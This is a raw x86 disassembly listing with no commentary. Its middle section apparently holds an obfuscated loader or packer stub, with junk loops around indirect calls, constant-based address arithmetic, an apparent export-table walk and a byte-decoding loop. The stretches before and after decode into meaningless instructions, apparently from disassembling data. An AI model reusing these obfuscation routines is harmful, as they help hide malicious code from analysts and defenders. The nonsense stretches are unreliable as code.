  410860:	aam    0x1b
  410862:	inc    ecx
  410863:	push   edx
  410864:	or     eax,0x877d7bc8
  410869:	xor    al,0xde
  41086b:	sahf   
  41086c:	pop    ds
  41086d:	shl    BYTE PTR [ebx-0x35f48b30],1
  410873:	jl     0x410844
  410875:	sub    eax,eax
  410877:	test   BYTE PTR [esi],0xca
  41087a:	dec    esi
  41087b:	fidivr WORD PTR [ebx-0xcbb9546]
  410881:	inc    ebp
  410882:	lods   eax,DWORD PTR ds:[esi]
  410883:	and    DWORD PTR [ebp+0x3],eax
  410886:	mov    ebx,0x426690ca
  41088b:	mov    edi,0x9df016af
  410890:	and    eax,0x48c18f5
  410895:	dec    edx
  410896:	push   ss
  410897:	jl     0x4108bd
  410899:	push   edx
  41089a:	xchg   BYTE PTR [ecx+0x57],ah
  41089d:	jmp    0x6688:0x1d01054b
  4108a4:	mov    ebx,0x8d27948a
  4108a9:	retf   
  4108aa:	call   0xd224:0x580f9840
  4108b1:	pop    ecx
  4108b2:	imul   esi,DWORD PTR ds:0x9b1d30f5,0x7b
  4108b9:	mov    ecx,0x69e9555e
  4108be:	xor    BYTE PTR [esi-0x5de3ce42],cl
  4108c4:	mov    ch,0xfd
  4108c6:	mov    esp,0xc1b4b34a
  4108cb:	pop    es
  4108cc:	test   dh,al
  4108ce:	loope  0x410852
  4108d0:	mov    ebp,0xcbc11e6a
  4108d5:	and    BYTE PTR [ebp-0x55],0x7e
  4108d9:	mov    cs,esi
  4108db:	lds    esi,FWORD PTR gs:[ebx+0x26af98b0]
  4108e2:	xchg   esp,eax
  4108e3:	cmp    bh,BYTE PTR [ebx+0x1f4b2854]
  4108e9:	ja     0x4108d4
  4108eb:	adc    esi,DWORD PTR [ecx]
  4108ed:	push   0xa68e6e38
  4108f2:	lods   al,BYTE PTR ds:[esi]
  4108f3:	cli    
  4108f4:	dec    ebp
  4108f5:	dec    ebp
  4108f6:	je     0x4108a7
  4108f8:	inc    ecx
  4108f9:	lds    ecx,FWORD PTR [edi-0x31d687ec]
  4108ff:	jo     0x41097e
  410901:	jmp    0x41091f
  410903:	and    esi,DWORD PTR [edi]
  410905:	in     al,dx
  410906:	mov    cl,al
  410908:	mov    bh,BYTE PTR [ecx]
  41090a:	xlat   BYTE PTR cs:[ebx]
  41090c:	inc    BYTE PTR [esi]
  41090e:	repnz sbb DWORD PTR ss:[edi],esi
  410912:	call   0xafb3d5c4
  410917:	xchg   edi,eax
  410918:	ror    BYTE PTR [eax],cl
  41091a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41091b:	out    dx,eax
  41091c:	jl     0x41097e
  41091e:	lea    ebx,[ebp+0x5c]
  410921:	test   al,0xff
  410923:	hlt    
  410924:	push   ss
  410925:	lods   al,BYTE PTR ds:[esi]
  410926:	sub    eax,edi
  410928:	mov    cl,0x6d
  41092a:	inc    cl
  41092c:	or     BYTE PTR [ebx-0x16],ah
  41092f:	sahf   
  410930:	je     0x410997
  410932:	fldl2t 
  410934:	adc    BYTE PTR [esi],dh
  410936:	cmp    al,0x63
  410938:	add    al,0xc
  41093a:	inc    ebp
  41093b:	pop    ss
  41093c:	xchg   BYTE PTR [esi-0x66],cl
  41093f:	mov    DWORD PTR [esi],eax
  410941:	out    0x3c,al
  410943:	ins    BYTE PTR es:[edi],dx
  410944:	dec    eax
  410945:	and    al,ch
  410947:	xchg   edx,eax
  410948:	mov    al,ds:0x3c57e850
  41094d:	adc    ebp,DWORD PTR [edi+0x4d]
  410950:	mov    BYTE PTR [edx],ah
  410952:	fiadd  WORD PTR [ecx+ebp*4-0x76]
  410956:	mov    BYTE PTR [edi-0x235885d5],dh
  41095c:	jecxz  0x41099c
  41095e:	dec    BYTE PTR [eax-0xcb87412]
  410964:	sub    al,0x79
  410966:	push   eax
  410967:	sub    BYTE PTR [eax+esi*1-0x3f],ch
  41096b:	ins    BYTE PTR es:[edi],dx
  41096c:	xor    eax,0xcb6dcb9
  410971:	cmp    DWORD PTR [ecx],edx
  410973:	ret    0x85f8
  410976:	add    ah,BYTE PTR [esi+0x5a8ef967]
  41097c:	push   ecx
  41097d:	and    al,0xcc
  41097f:	xchg   ebp,eax
  410980:	lods   al,BYTE PTR ds:[esi]
  410981:	pop    esi
  410982:	ret    0x84b7
  410985:	out    dx,al
  410986:	dec    esp
  410987:	(bad)
  41098a:	cmp    ch,BYTE PTR [ebx-0x20]
  41098d:	push   0xffffff84
  41098f:	dec    ecx
  410990:	das    
  410991:	add    al,0xbf
  410993:	ret    0x2b20
  410996:	dec    esi
  410997:	fs (bad) 
  410999:	in     eax,dx
  41099a:	jbe    0x41093f
  41099c:	dec    edi
  41099d:	jp     0x41095e
  41099f:	jae    0x4109db
  4109a1:	test   al,0x58
  4109a3:	out    dx,eax
  4109a4:	cmc    
  4109a5:	stos   DWORD PTR es:[edi],eax
  4109a6:	nop
  4109a7:	and    al,0x94
  4109a9:	lods   al,BYTE PTR ds:[esi]
  4109aa:	mul    al
  4109ac:	jne    0x4109bf
  4109ae:	cdq    
  4109af:	jmp    0x1f5:0xd648e017
  4109b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109b7:	pop    ecx
  4109b8:	enter  0x50e8,0xfc
  4109bc:	fist   WORD PTR [esi]
  4109be:	or     al,dl
  4109c0:	push   0x2e
  4109c2:	xchg   edx,eax
  4109c3:	ret    0xfcef
  4109c6:	in     al,dx
  4109c7:	push   0x34b8d9ac
  4109cc:	lahf   
  4109cd:	dec    edi
  4109ce:	mov    BYTE PTR [ebx+0x2c],al
  4109d1:	fnsave [edx-0x51c5e161]
  4109d7:	adc    DWORD PTR [esi+0x3b],esp
  4109da:	retf   0x850f
  4109dd:	dec    ebp
  4109de:	fdiv   st(7),st
  4109e0:	dec    DWORD PTR [ebx+0x4244350d]
  4109e6:	add    BYTE PTR [ebx+0x19889],cl
  4109ec:	add    BYTE PTR [ecx+0x21e901],cl
  4109f2:	add    BYTE PTR [eax],al
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx-0x732d9d61],0x57
  410fc4:	sub    BYTE PTR [esi],0xae
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x410fd8
  410fce:	mov    ds:0x54c9eff,al
  410fd3:	cli    
  410fd4:	or     al,0x61
  410fd6:	retf   0x8f2f
  410fd9:	fdivr  st,st(0)
  410fdb:	ds jns 0x410fce
  410fde:	sbb    BYTE PTR [ecx+0x7f],dh
  410fe1:	jmp    0x586475c8
  410fe6:	lods   eax,DWORD PTR ds:[esi]
  410fe7:	pop    ebp
  410fe8:	or     DWORD PTR [ebp+0x38],ebp
  410feb:	mov    edx,0x81f21194
  410ff0:	inc    edi
  410ff1:	fistp  QWORD PTR [ecx]
  410ff3:	mov    bl,0xa8
  410ff5:	sbb    cl,BYTE PTR [ecx]
  410ff7:	mov    bl,0xaa
  410ff9:	cmp    bh,BYTE PTR [edi+0x42]
  410ffc:	xchg   edx,eax
  410ffd:	fwait
  410ffe:	rol    bl,1
  411000:	mov    al,ds:0x48947d0
  411005:	pusha  
  411006:	mov    dl,0xa1
  411008:	jns    0x411088
  41100a:	(bad)  
  41100b:	stos   DWORD PTR es:[edi],eax
  41100c:	outs   dx,BYTE PTR ds:[esi]
  41100d:	push   es
  41100e:	ins    DWORD PTR es:[edi],dx
  41100f:	inc    ecx
  411010:	mov    edi,0x1c20a744
  411015:	push   ss
  411016:	shl    esi,0xd7
  411019:	sub    eax,0x871bdb17
  41101e:	loope  0x41102f
  411020:	adc    DWORD PTR [esi],0x8c049887
  411026:	jecxz  0x41105d
  411028:	retf   0x5e1b
  41102b:	out    dx,al
  41102c:	pop    ecx
  41102d:	sub    bl,BYTE PTR [edx-0x4378eed5]
  411033:	loope  0x411083
  411035:	jge    0x410fb8
  411037:	push   edi
  411038:	popa   
  411039:	mov    ecx,0x1bcc6987
  41103e:	icebp  
  41103f:	or     ah,BYTE PTR [ecx-0x7a]
  411042:	cmc    
  411043:	stos   BYTE PTR es:[edi],al
  411044:	jnp    0x41107c
  411046:	lea    ebx,[esi-0x25]
  411049:	push   ecx
  41104a:	sbb    esp,esi
  41104c:	mov    ah,0x32
  41104e:	add    al,0x2a
  411050:	or     al,0xc7
  411052:	fnstenv [eax+0x2f]
  411055:	mov    ds:0x24237153,eax
  41105a:	call   0x9061:0x1917138d
  411061:	les    ebx,FWORD PTR [ecx+0x4b114131]
  411067:	in     eax,0x4e
  411069:	push   es
  41106a:	push   0x1b8a3e1b
  41106f:	stos   BYTE PTR es:[edi],al
  411070:	(bad)  [ebx-0x2b]
  411073:	add    eax,0xe0ca89f8
  411078:	into   
  411079:	fistp  WORD PTR [ebp+0x36c7ca63]
  41107f:	add    BYTE PTR [edi],bh
  411081:	vpacksswb xmm3,xmm5,XMMWORD PTR [ecx+0x5d]
  411086:	xor    BYTE PTR [esi-0x11461d31],ah
  41108c:	fs lock mov ch,0x70
  411090:	sub    eax,0x432e4815
  411095:	fsubr  st,st(7)
  411097:	call   0xecf44190
  41109c:	iret   
  41109d:	mov    bl,0xb8
  41109f:	mov    ebp,0xfe790399
  4110a4:	jbe    0x41106b
  4110a6:	jl     0x411113
  4110a8:	xor    bl,ah
  4110aa:	push   0x2c
  4110ac:	push   edx
  4110ad:	jle    0x411124
  4110af:	retf   0x15ad
  4110b2:	les    eax,FWORD PTR [ecx-0x35c4a80]
  4110b8:	cmp    edi,DWORD PTR [eax-0x7efc6a16]
  4110be:	jl     0x411129
  4110c0:	ss jae 0x411133
  4110c3:	rol    BYTE PTR [edi],1
  4110c5:	mov    esi,0xfd52d6a9
  4110ca:	pop    esi
  4110cb:	nop
  4110cc:	scas   al,BYTE PTR es:[edi]
  4110cd:	cld    
  4110ce:	push   0x72
  4110d0:	jge    0x41114a
  4110d2:	jbe    0x411102
  4110d4:	push   ds
  4110d5:	sub    BYTE PTR [ebx+0x3cfff864],ch
  4110db:	(bad)  
  4110dc:	push   ebx
  4110dd:	mov    ah,0x46
  4110df:	cmp    al,0x2d
  4110e1:	mov    bh,0x4f
  4110e3:	mov    dh,0x59
  4110e5:	jmp    0x411103
  4110e7:	ret    
  4110e8:	call   0xa74388c0
  4110ed:	test   BYTE PTR [esi-0x71],al
  4110f0:	jne    0x41108a
  4110f2:	sub    BYTE PTR [edi-0x18db9f71],dh
  4110f8:	xchg   DWORD PTR [ebx-0x7a],ecx
  4110fb:	push   esi
  4110fc:	pop    ebx
  4110fd:	ja     0x4110c8
  4110ff:	cmp    eax,ebp
  411101:	sar    BYTE PTR [edx-0x5a85e7f5],cl
  411107:	inc    ebx
  411108:	and    cl,BYTE PTR ds:0x14c3c0fc
  41110e:	aam    0x2c
  411110:	add    cl,BYTE PTR [ecx+0x15eb0c27]
  411116:	(bad)  
  411117:	outs   dx,BYTE PTR ds:[esi]
  411118:	sti    
  411119:	jg     0x41118c
  41111b:	cmp    ebx,esi
  41111d:	jnp    0x4110c2
  41111f:	jns    0x411179
  411121:	lods   al,BYTE PTR ds:[esi]
  411122:	push   0x5e98eacf
  411127:	sub    BYTE PTR [esi-0x13],0x6a
  41112b:	xchg   DWORD PTR [ecx-0x6a],ebx
  41112e:	xchg   esi,eax
  41112f:	in     eax,dx
  411130:	stos   BYTE PTR es:[edi],al
  411131:	mov    esi,0xcbc40053
  411136:	leave  
  411137:	push   ecx
  411138:	xlat   BYTE PTR ds:[ebx]
  411139:	and    DWORD PTR [ebx],esi
  41113b:	adc    eax,0xd82e0bb8
  411140:	inc    ebx
  411141:	push   edx
  411142:	loope  0x4110c7
  411144:	fnstsw WORD PTR [eax+edi*4]
  411147:	aas    
  411148:	push   ebp
  411149:	mov    bh,0xfd
  41114b:	sub    ch,BYTE PTR [ebp+0x3668f950]
  411151:	shl    DWORD PTR [esi-0x605903d1],1
  411157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411158:	push   ebx
  411159:	xor    DWORD PTR [eax],esp
  41115b:	inc    edx
  41115c:	fcomip st,st(6)
  41115e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41115f:	fst    QWORD PTR [ecx-0x5d]
  411162:	repnz lock add esp,DWORD PTR [edx-0x202f7960]
  41116a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41116b:	(bad)  
  41116c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41116d:	shl    BYTE PTR [edx-0x7a],0x77
  411171:	jmp    0x57fd:0x50ec25ab
  411178:	(bad)  
  411179:	sbb    bl,BYTE PTR cs:[edi-0x63]
  41117d:	std    
  41117e:	or     BYTE PTR [edi+0x4d],ch
  411181:	jecxz  0x411138
  411183:	jno    0x411153
  411185:	jns    0x4111be
  411187:	xor    DWORD PTR [edx+0x5b],ebp
  41118a:	stos   DWORD PTR es:[edi],eax
  41118b:	xchg   esi,eax
  41118c:	out    dx,al
  41118d:	out    dx,al
  41118e:	in     al,0x3f
  411190:	cmp    DWORD PTR [edi+0x22],ecx
  411193:	fucomip st,st(3)
  411195:	fs mov edi,0x28b9bc73
  41119b:	sbb    al,bl
  41119d:	xor    dl,BYTE PTR [esi]
  41119f:	jl     0x411164
  4111a1:	retf   0xc25b
  4111a4:	int    0xb1
  4111a6:	add    BYTE PTR [ecx],ah
  4111a8:	bnd jp 0x411217
  4111ab:	sub    eax,0xc31cc4f1
  4111b0:	and    edi,DWORD PTR [ecx]
  4111b2:	shl    DWORD PTR [ebp+0x5e850dbb],1
  4111b8:	cmp    dh,BYTE PTR [esi+0x67]
  4111bb:	xlat   BYTE PTR ds:[ebx]
  4111bc:	mov    fs,esp
  4111be:	pop    eax
  4111bf:	ins    BYTE PTR es:[edi],dx
  4111c0:	mov    edx,0x165623d7
  4111c5:	outs   dx,DWORD PTR ds:[esi]
  4111c6:	sub    ah,BYTE PTR [edi+0x55fe46e5]
  4111cc:	xor    dl,ch
  4111ce:	mov    edi,0x89790dda
  4111d3:	inc    ecx
  4111d4:	shr    DWORD PTR [edx],1
  4111d6:	fldcw  WORD PTR ds:0xb4d1
  4111db:	test   eax,0x2da75574
  4111e0:	fld    QWORD PTR ds:0xa5715d22
  4111e6:	call   0xd5171a9e
  4111eb:	jg     0x411260
  4111ed:	lds    ebp,FWORD PTR [edi]
  4111ef:	icebp  
  4111f0:	into   
  4111f1:	xor    ecx,edi
  4111f3:	dec    eax
  4111f4:	or     ebx,DWORD PTR [esi+0x6c]
  4111f7:	lock xchg esi,eax
  4111f9:	(bad)  
  4111fa:	cmp    BYTE PTR [ecx+0x0],ah
  4111fd:	rol    DWORD PTR [edi-0x6a],1
  411200:	push   ss
  411201:	add    eax,DWORD PTR [ebx]
  411203:	jne    0x411204
  411205:	ja     0x4111c9
  411207:	sub    eax,ebx
  411209:	fisub  DWORD PTR [ecx+0x68895555]
  41120f:	bound  ecx,QWORD PTR [ebp+0x3d]
  411212:	pusha  
  411213:	test   BYTE PTR [edx],dh
  411215:	addr16 enter 0x66f5,0x60
